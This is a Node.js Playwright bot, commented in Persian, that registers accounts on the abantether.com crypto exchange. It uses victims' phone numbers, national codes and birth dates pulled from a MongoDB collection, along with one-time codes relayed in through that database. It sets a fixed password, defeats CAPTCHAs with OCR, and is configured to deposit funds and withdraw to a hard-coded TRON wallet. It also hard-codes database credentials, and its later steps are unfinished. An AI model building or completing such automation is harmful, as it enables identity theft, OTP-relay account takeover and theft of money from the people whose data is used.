const { chromium } = require('playwright');
const { MongoClient } = require('mongodb');
const Tesseract = require('tesseract.js');
const fs = require('fs').promises;
const path = require('path');

class AbanTetherBot {
    constructor() {
        // تنظیمات
        this.mongoUri = 'mongodb+srv://zarin_db_user:zarin22@cluster0.ukd7zib.mongodb.net/ZarrinApp?retryWrites=true&w=majority';
        this.dbName = 'ZarrinApp';
        this.collectionName = 'zarinapp';
        this.password = 'ImSorryButIhaveTo@1';
        this.depositAmount = '5000000';
        this.withdrawAmount = '40';
        this.withdrawAddress = 'THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS';
        this.maxRetries = 3;
        
        // متغیرها
        this.browser = null;
        this.page = null;
        this.currentUser = null;
        this.processingUsers = new Set();
        this.mongoClient = null;
        this.db = null;
        this.collection = null;
        this.screenshotsDir = './screenshots';
    }

    // --- توابع کمکی ---
    async log(step, message) {
        const timestamp = new Date().toISOString();
        console.log(`[${timestamp}] [${step}] ${message}`);
    }

    async sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async takeScreenshot(name) {
        try {
            await fs.mkdir(this.screenshotsDir, { recursive: true });
            const screenshotPath = path.join(this.screenshotsDir, `${name}-${Date.now()}.png`);
            await this.page.screenshot({ path: screenshotPath, fullPage: true });
            this.log('SCREENSHOT', `📸 عکس ذخیره شد: ${screenshotPath}`);
            return screenshotPath;
        } catch (error) {
            this.log('ERROR', `❌ خطا در گرفتن عکس: ${error.message}`);
        }
    }

    async connectToMongoDB() {
        try {
            this.mongoClient = new MongoClient(this.mongoUri);
            await this.mongoClient.connect();
            this.db = this.client.db(this.dbName);
            this.collection = this.db.collection(this.collectionName);
            this.log('DATABASE', '✅ متصل به دیتابیس شد');
        } catch (error) {
            this.log('ERROR', `❌ خطا در اتصال به دیتابیس: ${error.message}`);
            throw error;
        }
    }

    async updateUserStatus(phone, status, message, retryCount = 0) {
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phone },
                { 
                    $set: { 
                        status: status,
                        statusMessage: message,
                        lastUpdated: new Date(),
                        retryCount: retryCount
                    }
                }
            );
            this.log('STATUS', `📊 ${phone}: ${status} - ${message}`);
        } catch (error) {
            this.log('ERROR', `❌ خطا در آپدیت وضعیت: ${error.message}`);
        }
    }

    async waitForFieldInDB(phone, fieldName, timeout = 180000) {
        this.log('WAIT', `⏳ منتظر فیلد ${fieldName} برای ${phone}...`);
        const startTime = Date.now();
        
        while (Date.now() - startTime < timeout) {
            try {
                const user = await this.collection.findOne({ personalPhoneNumber: phone });
                
                if (user && user[fieldName] && user[fieldName].trim() !== '') {
                    const value = user[fieldName];
                    this.log('WAIT', `✅ ${fieldName} دریافت شد: ${value}`);
                    
                    await this.collection.updateOne(
                        { personalPhoneNumber: phone },
                        { $unset: { [fieldName]: "" } }
                    );
                    
                    return value;
                }
                
                await this.sleep(5000);
                
            } catch (error) {
                this.log('ERROR', `❌ خطا در بررسی ${fieldName}: ${error.message}`);
                await this.sleep(5000);
            }
        }
        
        throw new Error(`⏰ تایم‌اوت: فیلد ${fieldName} دریافت نشد`);
    }

    async markAsCompleted(phone) {
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phone },
                { 
                    $set: { 
                        processed: true,
                        status: "completed",
                        completedAt: new Date(),
                        statusMessage: "فرآیند با موفقیت تکمیل شد"
                    }
                }
            );
        } catch (error) {
            this.log('ERROR', `❌ خطا در علامت‌گذاری کاربر: ${error.message}`);
        }
    }

    // --- توابع بهبود یافته برای پیدا کردن المان‌ها ---
    async findAndFill(text, value, takeScreenshot = false) {
        try {
            this.log('FILL', `🔍 در حال پیدا کردن فیلد با متن: "${text}"`);
            
            if (takeScreenshot) await this.takeScreenshot(`before-fill-${text}`);
            
            // روش‌های مختلف برای پیدا کردن فیلد
            const strategies = [
                // 1. با placeholder
                async () => {
                    const selector = `input[placeholder*="${text}"]`;
                    const element = await this.page.$(selector);
                    if (element) {
                        await element.fill(value);
                        return true;
                    }
                    return false;
                },
                
                // 2. با label و input بعدی
                async () => {
                    const xpath = `//label[contains(text(), '${text}')]/following::input[1]`;
                    const element = await this.page.$(xpath);
                    if (element) {
                        await element.fill(value);
                        return true;
                    }
                    return false;
                },
                
                // 3. با aria-label
                async () => {
                    const selector = `input[aria-label*="${text}"]`;
                    const element = await this.page.$(selector);
                    if (element) {
                        await element.fill(value);
                        return true;
                    }
                    return false;
                },
                
                // 4. جستجوی همه inputها
                async () => {
                    const inputs = await this.page.$$('input, textarea');
                    for (const input of inputs) {
                        try {
                            const placeholder = await input.getAttribute('placeholder') || '';
                            const ariaLabel = await input.getAttribute('aria-label') || '';
                            if (placeholder.includes(text) || ariaLabel.includes(text)) {
                                await input.fill(value);
                                return true;
                            }
                        } catch {
                            continue;
                        }
                    }
                    return false;
                }
            ];
            
            for (const strategy of strategies) {
                try {
                    const result = await strategy();
                    if (result) {
                        this.log('FILL', `✅ پر شد: "${text}" = ${value}`);
                        await this.sleep(1000);
                        if (takeScreenshot) await this.takeScreenshot(`after-fill-${text}`);
                        return;
                    }
                } catch (error) {
                    continue;
                }
            }
            
            throw new Error(`فیلد "${text}" پیدا نشد`);
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در پر کردن فیلد: ${error.message}`);
            await this.takeScreenshot(`error-fill-${text}`);
            throw error;
        }
    }

    async findAndClick(text, takeScreenshot = false) {
        try {
            this.log('CLICK', `🔍 در حال پیدا کردن دکمه با متن: "${text}"`);
            
            if (takeScreenshot) await this.takeScreenshot(`before-click-${text}`);
            
            // انواع مختلف فاصله و حروف
            const variations = [
                text,                    // دقیقاً مثل ورودی
                text.replace(/\s+/g, ' ').trim(), // نرمال‌سازی فاصله
                text.replace(/\s/g, ''),          // بدون هیچ فاصله
                text.replace(/ی/g, 'ي'),          // جایگزینی ی عربی
                text.replace(/ک/g, 'ك'),          // جایگزینی ک عربی
            ];
            
            // حذف موارد تکراری
            const uniqueVariations = [...new Set(variations)];
            
            const strategies = [
                // 1. جستجو در buttonها
                async () => {
                    for (const variation of uniqueVariations) {
                        const selector = `button:has-text("${variation}")`;
                        const element = await this.page.$(selector);
                        if (element && await element.isVisible()) {
                            await element.click();
                            return true;
                        }
                    }
                    return false;
                },
                
                // 2. جستجو در لینک‌ها
                async () => {
                    for (const variation of uniqueVariations) {
                        const selector = `a:has-text("${variation}")`;
                        const element = await this.page.$(selector);
                        if (element && await element.isVisible()) {
                            await element.click();
                            return true;
                        }
                    }
                    return false;
                },
                
                // 3. جستجو با XPath (دقیق‌تر)
                async () => {
                    for (const variation of uniqueVariations) {
                        // XPath با contains برای متن ناقص
                        const xpath = `//*[contains(text(), '${variation}')]`;
                        const elements = await this.page.$$(xpath);
                        
                        for (const element of elements) {
                            try {
                                if (await element.isVisible()) {
                                    const tagName = await element.evaluate(el => el.tagName.toLowerCase());
                                    // فقط المان‌های قابل کلیک
                                    if (['button', 'a', 'input', 'div', 'span'].includes(tagName)) {
                                        await element.click();
                                        return true;
                                    }
                                }
                            } catch {
                                continue;
                            }
                        }
                    }
                    return false;
                },
                
                // 4. جستجو در inputهای نوع submit/button
                async () => {
                    const inputs = await this.page.$$('input[type="submit"], input[type="button"]');
                    for (const input of inputs) {
                        try {
                            const value = await input.getAttribute('value') || '';
                            for (const variation of uniqueVariations) {
                                if (value.includes(variation)) {
                                    await input.click();
                                    return true;
                                }
                            }
                        } catch {
                            continue;
                        }
                    }
                    return false;
                },
                
                // 5. جستجو در همه المان‌های قابل کلیک
                async () => {
                    const clickableElements = await this.page.$$('button, a, input, [role="button"], [onclick]');
                    
                    for (const element of clickableElements) {
                        try {
                            if (!(await element.isVisible())) continue;
                            
                            const elementText = await element.textContent() || '';
                            const valueAttr = await element.getAttribute('value') || '';
                            const fullText = (elementText + ' ' + valueAttr).trim();
                            
                            for (const variation of uniqueVariations) {
                                if (fullText.includes(variation) && variation.length > 0) {
                                    await element.scrollIntoViewIfNeeded();
                                    await element.click();
                                    return true;
                                }
                            }
                        } catch {
                            continue;
                        }
                    }
                    return false;
                }
            ];
            
            // اجرای همه استراتژی‌ها
            for (const strategy of strategies) {
                try {
                    const result = await strategy();
                    if (result) {
                        this.log('CLICK', `✅ کلیک شد: "${text}"`);
                        await this.sleep(2000);
                        if (takeScreenshot) await this.takeScreenshot(`after-click-${text}`);
                        return;
                    }
                } catch (error) {
                    continue;
                }
            }
            
            // اگر پیدا نشد، عکس بگیر و المان‌ها را لاگ کن
            await this.takeScreenshot(`not-found-${text}`);
            
            // لاگ کردن المان‌های موجود در صفحه
            const allButtons = await this.page.$$('button');
            for (const btn of allButtons) {
                try {
                    const btnText = await btn.textContent();
                    if (btnText && btnText.trim()) {
                        this.log('DEBUG', `🔍 دکمه موجود در صفحه: "${btnText.trim()}"`);
                    }
                } catch {
                    continue;
                }
            }
            
            throw new Error(`دکمه "${text}" پیدا نشد`);
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در کلیک کردن: ${error.message}`);
            await this.takeScreenshot(`error-click-${text}`);
            throw error;
        }
    }

    async selectDropdown(labelText, value) {
        try {
            this.log('SELECT', `🔍 انتخاب "${value}" برای "${labelText}"`);
            
            // پیدا کردن select بر اساس label
            const xpath = `//label[contains(text(), '${labelText}')]/following::select[1]`;
            const selectElement = await this.page.$(xpath);
            
            if (selectElement) {
                await selectElement.selectOption(value);
                this.log('SELECT', `✅ انتخاب شد: "${labelText}" = ${value}`);
                await this.sleep(1000);
                return;
            }
            
            throw new Error(`Dropdown با لیبل "${labelText}" پیدا نشد`);
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در انتخاب: ${error.message}`);
            throw error;
        }
    }

    // --- هوش مصنوعی برای کپچا ---
    async solveCaptchaWithAI(imageElement) {
        try {
            this.log('AI_CAPTCHA', '🔍 در حال پردازش کپچا با AI...');
            
            const screenshotBuffer = await imageElement.screenshot();
            
            const { data: { text } } = await Tesseract.recognize(screenshotBuffer, 'fas');
            const cleanedText = text.replace(/\s+/g, '').trim();
            
            this.log('AI_CAPTCHA', `✅ کپچا تشخیص داده شد: "${cleanedText}"`);
            return cleanedText;
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در پردازش کپچا: ${error.message}`);
            throw error;
        }
    }

    // --- مراحل اصلی ---
    async initializeBrowser() {
        try {
            this.log('BROWSER', '🚀 در حال راه‌اندازی مرورگر...');
            
            this.browser = await chromium.launch({ 
                headless: false, // false برای دیباگ
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage'
                ],
                slowMo: 500 // کاهش سرعت برای مشاهده
            });
            
            const context = await this.browser.newContext({
                viewport: { width: 1280, height: 720 }
            });
            
            this.page = await context.newPage();
            await this.page.setDefaultTimeout(60000);
            
            this.log('BROWSER', '✅ مرورگر آماده است');
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در راه‌اندازی مرورگر: ${error.message}`);
            throw error;
        }
    }

    async step1_Register(user) {
        try {
            this.log('STEP_1', '📝 مرحله 1: ثبت‌نام');
            await this.updateUserStatus(user.personalPhoneNumber, 'registering', 'در حال ثبت‌نام');
            
            // عکس از صفحه اول
            await this.takeScreenshot('step1-start');
            
            await this.page.goto('https://abantether.com/register', { waitUntil: 'networkidle' });
            await this.sleep(3000);
            
            // عکس بعد از لود صفحه
            await this.takeScreenshot('step1-page-loaded');
            
            // وارد کردن شماره موبایل
            await this.findAndFill('شماره موبایل خود را وارد کنید', user.personalPhoneNumber, true);
            
            // کلیک روی دکمه ثبت‌نام (با زدن فاصله)
            await this.findAndClick('ثبت‌نام', true);
            
            await this.sleep(3000);
            
            // عکس بعد از کلیک
            await this.takeScreenshot('step1-after-click');
            
            // وارد کردن کد OTP
            const otpLogin = await this.waitForFieldInDB(user.personalPhoneNumber, 'otp_login');
            await this.findAndFill('کد ارسال شده به شماره موبایل خود را وارد کنید', otpLogin, true);
            
            // کلیک روی مرحله بعد
            await this.findAndClick('مرحله بعد', true);
            
            this.log('STEP_1', '✅ مرحله 1 تکمیل شد');
            await this.sleep(3000);
            
            // عکس نهایی مرحله 1
            await this.takeScreenshot('step1-completed');
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در مرحله 1: ${error.message}`);
            await this.takeScreenshot('step1-error');
            throw error;
        }
    }

    async step2_Password(user) {
        try {
            this.log('STEP_2', '🔐 مرحله 2: رمز عبور');
            await this.updateUserStatus(user.personalPhoneNumber, 'setting_password', 'تنظیم رمز عبور');
            
            await this.takeScreenshot('step2-start');
            
            // وارد کردن رمز عبور
            await this.findAndFill('رمز عبور خود را وارد نمایید', this.password, true);
            
            // کلیک روی تایید
            await this.findAndClick('تایید', true);
            
            this.log('STEP_2', '✅ مرحله 2 تکمیل شد');
            await this.sleep(3000);
            
            await this.takeScreenshot('step2-completed');
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در مرحله 2: ${error.message}`);
            await this.takeScreenshot('step2-error');
            throw error;
        }
    }

    async step3_Identity(user) {
        try {
            this.log('STEP_3', '🆔 مرحله 3: اطلاعات هویتی');
            await this.updateUserStatus(user.personalPhoneNumber, 'verifying_identity', 'تأیید اطلاعات هویتی');
            
            await this.takeScreenshot('step3-start');
            
            // وارد کردن کد ملی
            await this.findAndFill('کد 10 رقمی شناسایی خود را وارد کنید', user.personalNationalCode, true);
            
            // وارد کردن تاریخ تولد
            await this.findAndFill('روز/ماه/سال', user.personalBirthDate, true);
            
            // کلیک روی ثبت
            await this.findAndClick('ثبت', true);
            
            this.log('STEP_3', '✅ مرحله 3 تکمیل شد');
            await this.sleep(5000);
            
            // بررسی باکس تبریک
            const continueButton = await this.page.$('button:has-text("ادامه"), button:has-text("تایید")');
            if (continueButton) {
                await continueButton.click();
                this.log('POPUP', '✅ باکس تبریک بسته شد');
                await this.sleep(2000);
            }
            
            await this.takeScreenshot('step3-completed');
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در مرحله 3: ${error.message}`);
            await this.takeScreenshot('step3-error');
            throw error;
        }
    }

    async step4_GoToWallet() {
        try {
            this.log('STEP_4', '💰 مرحله 4: رفتن به کیف پول');
            await this.updateUserStatus(this.currentUser.personalPhoneNumber, 'going_to_wallet', 'رفتن به کیف پول');
            
            await this.takeScreenshot('step4-start');
            
            // کلیک روی کیف پول در تول بار
            await this.findAndClick('کیف پول', true);
            
            await this.sleep(2000);
            await this.takeScreenshot('step4-wallet-page');
            
            // کلیک روی واریز
            await this.findAndClick('واریز', true);
            await this.sleep(1000);
            
            // کلیک روی تومان
            await this.findAndClick('تومان', true);
            
            this.log('STEP_4', '✅ مرحله 4 تکمیل شد');
            await this.takeScreenshot('step4-completed');
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در مرحله 4: ${error.message}`);
            await this.takeScreenshot('step4-error');
            throw error;
        }
    }

    // بقیه مراحل (5 تا 9) مانند قبل اما با takeScreenshot در نقاط مهم

    async processUser(user) {
        const phone = user.personalPhoneNumber;
        const retryCount = user.retryCount || 0;
        
        this.currentUser = user;
        this.processingUsers.add(phone);
        
        try {
            this.log('PROCESS', `👤 شروع پردازش کاربر: ${phone} (تلاش ${retryCount + 1}/${this.maxRetries})`);
            await this.updateUserStatus(phone, 'starting', 'شروع فرآیند', retryCount);
            
            await this.initializeBrowser();
            
            // اجرای مراحل
            await this.step1_Register(user);
            await this.step2_Password(user);
            await this.step3_Identity(user);
            await this.step4_GoToWallet();
            // TODO: ادامه مراحل 5 تا 9
            
            await this.updateUserStatus(phone, 'completed', 'فرآیند با موفقیت تکمیل شد', retryCount);
            await this.markAsCompleted(phone);
            
            this.log('SUCCESS', `🎉 کاربر ${phone} با موفقیت پردازش شد`);
            
            if (this.browser) {
                await this.browser.close();
                this.browser = null;
                this.page = null;
            }
            
        } catch (error) {
            this.log('ERROR', `💥 خطا در پردازش کاربر ${phone}: ${error.message}`);
            
            const newRetryCount = retryCount + 1;
            
            if (newRetryCount >= this.maxRetries) {
                await this.updateUserStatus(phone, 'failed', `شکست پس از ${this.maxRetries} تلاش`, newRetryCount);
                this.log('RETRY', `⛔ حداکثر تلاش‌ها برای ${phone} تمام شد`);
            } else {
                await this.updateUserStatus(phone, 'failed', `تلاش ${newRetryCount}/${this.maxRetries}`, newRetryCount);
                this.log('RETRY', `🔄 کاربر ${phone} برای تلاش مجدد علامت‌گذاری شد`);
            }
            
            if (this.browser) {
                await this.browser.close();
                this.browser = null;
                this.page = null;
            }
            
            throw error;
            
        } finally {
            this.processingUsers.delete(phone);
            this.currentUser = null;
        }
    }

    async startPolling() {
        await this.connectToMongoDB();
        this.log('POLLING', '🔄 شروع نظارت بر دیتابیس (هر 30 ثانیه)');
        
        await this.checkDatabase();
        
        setInterval(async () => {
            try {
                await this.checkDatabase();
            } catch (error) {
                this.log('ERROR', `❌ خطا در نظارت: ${error.message}`);
            }
        }, 30000);
    }

    async checkDatabase() {
        try {
            const query = {
                $or: [
                    { otp_login: { $exists: true, $ne: null, $ne: '' } },
                    { otp_register_card: { $exists: true, $ne: null, $ne: '' } },
                    { otp_payment: { $exists: true, $ne: null, $ne: '' } }
                ],
                processed: { $ne: true },
                status: { $ne: 'failed' },
                $or: [
                    { retryCount: { $exists: false } },
                    { retryCount: { $lt: this.maxRetries } }
                ]
            };

            const pendingUsers = await this.collection.find(query).limit(10).toArray();
            this.log('DATABASE', `📊 ${pendingUsers.length} کاربر نیازمند پردازش یافت شد`);
            
            for (const user of pendingUsers) {
                const phone = user.personalPhoneNumber;
                
                if (!this.processingUsers.has(phone)) {
                    this.log('PROCESSING', `🚀 شروع پردازش برای: ${phone}`);
                    
                    this.processUser(user).catch(error => {
                        this.log('ERROR', `خطا در پردازش ${phone}: ${error.message}`);
                    });
                } else {
                    this.log('SKIP', `⏭️ ${phone} در حال پردازش است`);
                }
            }
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در بررسی دیتابیس: ${error.message}`);
        }
    }

    async start() {
        this.log('START', '🤖 ربات آبان تتر راه‌اندازی شد');
        this.log('CONFIG', `حداکثر تلاش‌ها: ${this.maxRetries}`);
        
        try {
            await this.startPolling();
            
            process.on('SIGINT', async () => {
                this.log('SHUTDOWN', '🛑 دریافت سیگنال خاتمه...');
                if (this.mongoClient) await this.mongoClient.close();
                process.exit(0);
            });
            
            process.on('SIGTERM', async () => {
                this.log('SHUTDOWN', '🛑 دریافت سیگنال ترمینیت...');
                if (this.mongoClient) await this.mongoClient.close();
                process.exit(0);
            });
            
        } catch (error) {
            this.log('ERROR', `💥 خطا در راه‌اندازی: ${error.message}`);
            setTimeout(() => this.start(), 10000);
        }
    }
}

// --- اجرای ربات ---
const bot = new AbanTetherBot();

process.on('unhandledRejection', (error) => {
    console.error('[UNHANDLED_REJECTION]', error);
});

process.on('uncaughtException', (error) => {
    console.error('[UNCAUGHT_EXCEPTION]', error);
});

bot.start();